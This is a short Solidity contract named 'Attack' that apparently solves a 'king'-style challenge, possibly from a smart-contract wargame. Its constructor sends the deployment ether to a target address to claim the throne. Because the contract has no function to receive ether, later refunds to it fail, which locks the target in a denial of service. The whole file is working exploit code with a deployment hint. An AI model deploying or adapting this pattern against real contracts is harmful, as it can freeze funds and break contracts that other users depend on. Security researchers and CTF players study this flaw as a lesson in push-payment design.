//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @dev deploy with at least 0.001 ether 
 */
contract Attack {
    constructor(address payable _king) payable {
        (bool s, ) = _king.call{value: msg.value}("");
        require(s);
    }
}